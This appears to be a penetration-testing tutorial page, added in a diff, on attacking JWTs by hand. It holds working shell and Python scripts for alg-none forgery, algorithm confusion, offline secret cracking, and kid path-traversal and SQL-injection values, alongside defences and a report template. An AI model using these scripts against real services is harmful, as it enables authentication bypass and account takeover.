@@ -1,0 +1,231 @@
+<h1 id="jwt-and-token-attacks-by-hand">JWT and Token Attacks by Hand</h1>
+<h2 id="summary">Summary</h2>
+<p><code>ps-07</code> covered the theory and ran an attack battery in Python. This note is the manual version:<br />
+how to decode, tamper, re-sign, and forge against a live service using only <code>openssl</code>, <code>base64</code>,<br />
+and a text editor.</p>
+<p>The reason to do it by hand once is that a library hides exactly the<br />
+step that attackers rely on — the split into <code>header.payload.signature</code><br />
+and the choice of what the library lets you change.</p>
+<blockquote>
+<p>Companion to <code>ps-07</code> and <code>cry-04</code>. This is the operations manual.</p>
+</blockquote>
+<h2 id="the-anatomy-by-hand">The anatomy, by hand</h2>
+<pre><code class="language-bash"># a real JWT, any real JWT
+JWT=&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NjAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c&quot;
+
+echo &quot;  header  : $(echo &quot;$JWT&quot; | cut -d. -f1)&quot;
+echo &quot;$JWT&quot; | cut -d. -f1 | base64 -d 2&gt;/dev/null; echo
+echo &quot;  payload : $(echo &quot;$JWT&quot; | cut -d. -f2)&quot;
+echo &quot;$JWT&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null; echo
+echo &quot;  sig     : $(echo &quot;$JWT&quot; | cut -d. -f3)&quot;
+echo
+echo &quot;  The payload is PLAINTEXT, just base64. Anyone can read it.&quot;
+echo &quot;  base64 is an encoding, not encryption (cry-01).&quot;
+</code></pre>
+<h2 id="step-1-read-every-claim-and-note-what-is-missing">Step 1: read every claim, and note what is missing</h2>
+<pre><code class="language-bash">decode() { echo &quot;$1&quot; | cut -d. -f&quot;$2&quot; | base64 -d 2&gt;/dev/null; echo; }
+JWT=&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NjAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c&quot;
+decode &quot;$JWT&quot; 1 | python3 -m json.tool 2&gt;/dev/null | sed 's/^/  /'
+decode &quot;$JWT&quot; 2 | python3 -m json.tool 2&gt;/dev/null | sed 's/^/  /'
+echo
+echo &quot;  THE AUDIT, before you attack anything:&quot;
+echo &quot;    alg       what is it? (none / HS256 / RS256 / ES256)&quot;
+echo &quot;    iss       present? matches the server?&quot;
+echo &quot;    aud       present? matches THIS app?&quot;
+echo &quot;    exp       present? when?&quot;
+echo &quot;    nbf       present?&quot;
+echo &quot;    sub       what does the server DO with it?&quot;
+echo &quot;    kid       present? -&gt; a possible key-injection vector&quot;
+echo &quot;    jti       present? -&gt; is there revocation?&quot;
+</code></pre>
+<h2 id="step-2-the-two-edits-you-always-make">Step 2: the two edits you always make</h2>
+<pre><code class="language-bash">#!/usr/bin/env bash
+# jwt-edit.sh - the whole attack surface in one file
+# usage: ./jwt-edit.sh &lt;jwt&gt;
+JWT=&quot;$1&quot;
+H=$(echo &quot;$JWT&quot; | cut -d. -f1)
+P=$(echo &quot;$JWT&quot; | cut -d. -f2)
+b64() { printf '%s' &quot;$1&quot; | base64 -w0 | tr '+/' '-_' | tr -d '='; }
+d()   { echo &quot;$1&quot; | tr '_-' '/+' | base64 -d 2&gt;/dev/null; }
+
+echo &quot;=== ORIGINAL ===&quot;
+d &quot;$H&quot; | python3 -m json.tool | sed 's/^/  /'
+d &quot;$P&quot; | python3 -m json.tool | sed 's/^/  /'
+echo
+
+echo &quot;=== EDIT 1: remove the expiry (exp = far future) ===&quot;
+P1=$(d &quot;$P&quot; | python3 -c &quot;
+import json,sys
+p = json.load(sys.stdin)
+p['exp'] = 4102444800   # 2100-01-01
+print(json.dumps(p, separators=(',',':')))&quot;)
+echo &quot;  payload: $P1&quot;
+echo &quot;  forged : $(b64 &quot;$H&quot;).$(b64 &quot;$P1&quot;).&lt;signature&gt;&quot;
+echo &quot;  ^ the signature is now wrong. The server will reject it.&quot;
+echo &quot;    That is expected. The point is you can produce ANY claim.&quot;
+echo
+
+echo &quot;=== EDIT 2: alg none ===&quot;
+HN='{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}'
+echo &quot;  forged : $(b64 &quot;$HN&quot;).$(b64 &quot;$P1&quot;).&quot;
+echo &quot;  ^ no signature at all. If the server accepts this, it is Critical.&quot;
+echo
+
+echo &quot;=== EDIT 3: empty signature ===&quot;
+echo &quot;  forged : $(b64 &quot;$HN&quot;).$(b64 &quot;$P1&quot;).AAAAdeadbeef&quot;
+echo &quot;  ^ many verifiers never look at the signature when alg is none.&quot;
+echo
+
+echo &quot;=== the claims worth changing, listed ===&quot;
+for c in sub role admin user_id is_admin scope aud iss; do
+  printf &quot;  %-10s -&gt; if the server trusts it without a check, this is an escalation\n&quot; &quot;$c&quot;
+done
+echo
+echo &quot;=== TO SUBMIT: replace the token in the request ===&quot;
+echo &quot;  curl -H 'Authorization: Bearer &lt;forged&gt;' https://target/api/me&quot;
+echo &quot;  or: curl -b 'session=&lt;forged&gt;' https://target/&quot;
+</code></pre>
+<h2 id="step-3-the-algorithm-confusion-attack-by-hand">Step 3: the algorithm confusion attack, by hand</h2>
+<pre><code class="language-bash"># The RSA public key, as the server holds it
+openssl s_client -connect target:443 -servername target &lt;/dev/null 2&gt;/dev/null \
+  | openssl x509 -pubkey -noout &gt; pub.pem
+
+# Now use that PUBLIC KEY as an HMAC secret, and sign with alg HS256
+PAYLOAD=$(echo '{&quot;sub&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;exp&quot;:4102444800}' \
+  | base64 -w0 | tr '+/' '-_' | tr -d '=')
+HEADER=$(echo '{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}' \
+  | base64 -w0 | tr '+/' '-_' | tr -d '=')
+
+# The &quot;secret&quot; is the public key file, byte for byte
+SIG=$(printf '%s.%s' &quot;$HEADER&quot; &quot;$PAYLOAD&quot; \
+  | openssl dgst -sha256 -hmac &quot;$(cat pub.pem)&quot; -binary \
+  | base64 -w0 | tr '+/' '-_' | tr -d '=')
+
+echo &quot;  forged: ${HEADER}.${PAYLOAD}.${SIG}&quot;
+echo
+echo &quot;  WHY IT WORKS:&quot;
+echo &quot;    RS256 verification needs only the PUBLIC key - so the server has it.&quot;
+echo &quot;    HS256 signing needs a SECRET - but if the server accepts the public&quot;
+echo &quot;    key as an HMAC secret, it is verifying an HS256 signature with the&quot;
+echo &quot;    very key an attacker can read. Asymmetry becomes symmetry.&quot;
+echo
+echo &quot;  The defence is one line in the library:&quot;
+echo &quot;    configure the expected algorithm; never read alg from the token.&quot;
+</code></pre>
+<h2 id="step-4-brute-forcing-a-weak-hs256-secret-offline">Step 4: brute-forcing a weak HS256 secret, offline</h2>
+<pre><code class="language-bash">#!/usr/bin/env bash
+# The key insight: this runs OFFLINE. No rate limit, no lockout,
+# no server contact. You are not attacking the server; you are
+# attacking a string you already have.
+J=&quot;$1&quot;
+H=$(echo &quot;$J&quot; | cut -d. -f1); P=$(echo &quot;$J&quot; | cut -d. -f2); S=$(echo &quot;$J&quot; | cut -d. -f3)
+WORDLIST=&quot;${2:-/usr/share/wordlists/rockyou.txt}&quot;
+
+for w in $(head -200000 &quot;$WORDLIST&quot;); do
+  got=$(printf '%s.%s' &quot;$H&quot; &quot;$P&quot; | openssl dgst -sha256 -hmac &quot;$w&quot; -binary \
+        | base64 -w0 | tr '+/' '-_' | tr -d '=')
+  if [ &quot;$got&quot; = &quot;$S&quot; ]; then echo &quot;  SECRET FOUND: $w&quot;; exit 0; fi
+done
+echo &quot;  not found in the first 200k of $WORDLIST&quot;
+echo
+echo &quot;  This is the whole attack. Note what it is NOT:&quot;
+echo &quot;    - not a login attempt, so no MFA, no lockout, no alert&quot;
+echo &quot;    - not a server request, so no rate limit&quot;
+echo &quot;    - it does not even need the server to be UP&quot;
+echo
+echo &quot;  The defence is a 256-bit secret. A JWT signed with HS256 and a&quot;
+echo &quot;  weak secret is equivalent to a password with a low entropy.&quot;
+</code></pre>
+<pre><code class="language-python"># the same thing, faster, using hmac directly
+import hmac, hashlib, base64, sys, time
+
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b&quot;=&quot;)
+
+def try_secret(jwt: str, secret: str) -&gt; bool:
+    h, p, s = jwt.split(&quot;.&quot;)
+    expect = b64u(hmac.new(secret.encode(), f&quot;{h}.{p}&quot;.encode(), hashlib.sha256).digest())
+    return hmac.compare_digest(expect.decode(), s)
+
+jwt = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;&quot;
+if jwt:
+    print(&quot;\n  trying a dictionary, with a progress report:&quot;)
+    t0 = time.time()
+    n = 0
+    try:
+        for w in open(&quot;/usr/share/wordlists/rockyou.txt&quot;, encoding=&quot;latin-1&quot;):
+            w = w.rstrip(&quot;\n&quot;)
+            n += 1
+            if try_secret(jwt, w):
+                print(f&quot;  FOUND after {n} candidates in {time.time()-t0:.1f}s: {w!r}&quot;)
+                sys.exit(0)
+            if n % 200000 == 0:
+                print(f&quot;    {n:,} tried...&quot;)
+    except FileNotFoundError:
+        print(&quot;  rockyou not at the default path; pass a wordlist&quot;)
+    print(f&quot;  {n:,} tried in {time.time()-t0:.1f}s, no match&quot;)
+else:
+    print(&quot;  usage: crack_jwt.py &lt;jwt&gt;   (the offline half of a JWT attack)&quot;)
+</code></pre>
+<h2 id="step-5-kid-injection">Step 5: <code>kid</code> injection</h2>
+<pre><code class="language-text">  IF THE TOKEN HAS A kid HEADER, the server uses it to CHOOSE A KEY.
+  How the server resolves it determines the vulnerability:
+
+    kid = ../../../../dev/null    -&gt; the &quot;key&quot; is empty or a file
+    kid = &quot;../../../../etc/passwd&quot; -&gt; the key becomes a file's contents
+    kid = &quot;sql' UNION SELECT ... --&quot; -&gt; key lookup is a SQL query
+
+  IF THE KEY IS THEN USED AS AN HMAC SECRET (HS256):
+    the attacker controls the secret, so any signature verifies.
+
+  TEST: change the kid to a path and to a SQL fragment and observe.
+  The safe design is a strict allowlist of key identifiers.
+</code></pre>
+<pre><code class="language-bash"># check whether kid exists at all before trying anything
+echo &quot;$J&quot; | cut -d. -f1 | base64 -d 2&gt;/dev/null | grep -q '&quot;kid&quot;' \
+  &amp;&amp; echo &quot;  kid present - test it&quot; \
+  || echo &quot;  no kid - this attack does not apply&quot;
+</code></pre>
+<h2 id="step-6-the-reporting-standard">Step 6: the reporting standard</h2>
+<pre><code class="language-text">  ## F-xx · JWT accepted with `alg: none`
+
+  Risk
+    The API accepts a JWT with the algorithm header set to &quot;none&quot; and
+    no signature, allowing any user to mint a token for any identity,
+    including administrator. Full account takeover and, depending on the
+    API's scope, data access as any account.
+
+  Prerequisite
+    Any HTTP access to the API. No credentials, no user interaction.
+
+  Evidence
+    ```
+    GET /api/admin/users HTTP/1.1
+    Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+    ```
+    -&gt; HTTP 200 with the full user list, as an unauthenticated caller.
+
+  Remediation
+    1. Configure the expected algorithm server-side; reject &quot;none&quot;
+    2. Use a maintained JWT library and upgrade it
+    3. Reject any token whose header algorithm is not in an allowlist
+    4. Re-issue all sessions: existing tokens signed under the old
+       behaviour remain valid
+
+  Re-test
+    Included at +30 days.
+</code></pre>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why can you read a JWT's payload without any key?</li>
+<li>Name the claims you check and what fails when each is missing.</li>
+<li>What does <code>alg: none</code> require the server to get wrong?</li>
+<li>Explain algorithm confusion in one sentence, and give the fix.</li>
+<li>Why is brute-forcing an HS256 secret fundamentally different from brute-forcing a password?</li>
+<li>What is <code>kid</code> injection, and what is the safe design?</li>
+<li>Why must an engagement re-issue sessions after a JWT finding?</li>
+<li>What five fields go in a JWT evidence block?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>JWT</strong> → <strong>Token Validation</strong> → <strong>Algorithm Confusion</strong> → <strong>Session Fixation</strong> →<br />
+<strong>Authentication Bypass</strong>.<br />
+<code>ps-07</code> is the theory and the Python; this is the shell.</p>
